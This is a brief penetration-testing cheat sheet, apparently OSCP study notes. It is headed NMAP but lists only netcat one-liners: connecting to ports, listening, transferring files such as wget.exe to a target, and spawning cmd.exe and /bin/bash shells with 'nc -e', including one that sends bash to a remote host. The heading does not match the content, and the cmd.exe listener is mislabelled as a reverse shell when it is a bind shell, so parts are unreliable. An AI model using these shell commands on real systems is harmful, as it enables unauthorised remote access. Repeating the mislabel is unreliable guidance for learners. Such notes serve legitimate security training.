## NMAP

#### Useful Links

[OSCP Survival Guide - port-scanning](https://github.com/frizb/OSCP-Survival-Guide#port-scanning)

#### Read and write TCP and UDP Packets

##### Connect to a POP3 mail server  
`nc -nv $ip 110`

##### Listen on TCP/UDP port  
`nc -nlvp 4444`

##### Connect to a netcat port  
`nc -nv $ip 4444`

##### Send a file using netcat  
`nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe`

##### Receive a file using netcat  
`nc -nlvp 4444 &gt; incoming.exe`

##### Create a reverse shell with Ncat using cmd.exe on Windows  
`nc -nlvp 4444 -e cmd.exe`

##### Create a reverse shell with Ncat using bash on Linux  
`nc -nv $ip 4444 -e /bin/bash`